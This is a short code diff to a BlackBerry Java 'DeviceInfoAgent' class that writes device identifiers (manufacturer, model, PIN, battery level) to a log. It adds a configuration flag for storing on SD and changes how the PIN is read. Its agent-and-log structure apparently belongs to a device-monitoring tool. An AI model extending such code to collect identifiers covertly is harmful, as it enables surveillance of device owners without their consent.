@@ -16,6 +16,7 @@ import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
+import blackberry.Conf;
 import blackberry.Device;
 import blackberry.log.Log;
 import blackberry.log.LogType;
@@ -43,7 +44,7 @@ public final class DeviceInfoAgent extends Agent {
      *            the agent status
      */
     public DeviceInfoAgent(final boolean agentStatus) {
-        super(AGENT_DEVICE, agentStatus, true, "DeviceInfoAgent");
+        super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD, "DeviceInfoAgent");
         //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
                 "Wrong Conversion");
@@ -87,7 +88,7 @@ public final class DeviceInfoAgent extends Agent {
         }
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
-        sb.append("Pin: " + NumberUtilities.toString( DeviceInfo.getDeviceId(), 16) + "\n");
+        sb.append("Pin: " + Device.getPin() + "\n");
 
         // Alimentazione
         sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
